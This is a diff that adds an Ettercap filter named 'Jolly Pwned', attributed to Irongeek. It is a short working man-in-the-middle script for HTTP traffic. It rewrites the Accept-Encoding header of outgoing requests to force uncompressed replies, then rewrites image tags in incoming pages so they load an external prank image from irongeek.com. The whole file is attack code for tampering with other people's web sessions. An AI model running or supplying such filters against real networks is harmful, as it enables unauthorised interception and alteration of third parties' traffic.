@@ -1,0 +1,27 @@
+
+############################################################################
+#                                                                          #
+#  Jolly Pwned -- ig.filter -- filter source file                          #
+#                                                                          #
+#  By Irongeek. based on code from ALoR & NaGA                             #
+#  Along with some help from Kev and jon.dmml                              #
+#  http://ettercap.sourceforge.net/forum/viewtopic.php?t=2833              #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+	  # note: replacement string is same length as original string
+      msg("zapped Accept-Encoding!\n");
+   }
+}
+if (ip.proto == TCP && tcp.src == 80) {
+   replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
+   replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
+   msg("Filter Ran.\n");
+}
